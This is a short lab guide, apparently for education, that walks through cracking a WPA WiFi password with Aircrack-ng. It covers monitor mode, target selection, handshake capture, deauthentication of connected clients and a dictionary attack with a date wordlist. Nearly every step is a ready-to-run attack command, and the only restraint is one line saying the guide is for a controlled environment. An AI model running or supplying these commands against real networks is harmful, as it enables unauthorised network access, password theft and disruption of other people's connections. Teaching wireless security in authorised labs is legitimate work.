# WiFi Cracking Lab Instructions

## Prerequisites
- WiFi card supporting monitor mode
- Aircrack-ng suite
- Wordlist file (`dates_1920_2024_wordlist.txt`)

## Steps

### 1. Environment Preparation
Stop interfering network processes:
```bash
sudo airmon-ng check kill
```

### 2. Enable Monitor Mode
Identify your wireless interface:
```bash
iwconfig
```
Start monitor mode:
```bash
sudo airmon-ng start <interface>
```
Check monitor mode:
```bash
iwconfig
```

### 3. Target Network Identification
List networks:
```bash
sudo airodump-ng <monitor_interface>
```
Note BSSID and channel of the target.

### 4. Capture Handshake
Capture handshake:
```bash
sudo airodump-ng --channel <channel> --bssid <BSSID> --write hackMewifi <monitor_interface>
```

### 5. Deauthenticate Client (Optional)
Force handshake capture:
```bash
sudo aireplay-ng --deauth 5 -a <BSSID> -c <client_MAC> <monitor_interface>
```

### 6. Crack WiFi Password
Crack password:
```bash
aircrack-ng hackMewifi-01.cap -w <wordlist>
```

### 7. Cleanup
Restart network services:
```bash
sudo systemctl restart NetworkManager
```
Stop monitor mode:
```bash
sudo airmon-ng stop <monitor_interface>
```

## Conclusion
Follow these steps to crack a WiFi password using Aircrack-ng. This guide is for educational purposes in a controlled environment.
